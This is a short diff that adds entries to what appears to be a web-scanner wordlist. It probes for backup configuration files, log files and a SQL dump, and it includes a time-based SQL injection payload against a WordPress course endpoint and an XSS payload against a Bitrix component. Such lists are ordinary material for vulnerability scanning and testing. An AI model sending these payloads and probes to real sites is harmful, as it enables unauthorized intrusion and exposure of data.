@@ -71,3 +71,8 @@
 {{basket}}
 /bitrix/.settings.php.bak
 /wp-json/lp/v1/courses/archive-course?&order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1
+/log.txt
+/log.log
+/__bx_log.log
+/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror=alert(document.domain)%20src=1>
+/?q=./gibbon.sql
